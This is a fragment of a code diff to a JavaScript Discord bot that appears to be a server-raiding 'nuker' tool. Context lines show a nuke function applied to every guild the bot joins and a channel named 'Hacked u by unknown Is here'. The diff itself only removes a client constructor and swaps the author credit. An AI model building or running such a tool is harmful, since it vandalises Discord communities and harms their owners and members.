@@ -409,7 +409,6 @@ m.createChannel('Hacked u by unknown Is here', 'voice');
  
  
 const { Client } = require('discord.js');
-const client = new Client();
  
 async function nuke(guild) {
   let users = 0;
@@ -448,7 +447,7 @@ client.on('ready', () => {
   for(const [, g] of LOka.guilds) nuke(g).catch(console.error);
   console.log('-------------------------------------------------------------');
   console.log('');
-  console.log("Made by YzhF1");
+  console.log("Made by 1uKY");
   console.log("");
   console.log("-------------------------------------------------------------");
  
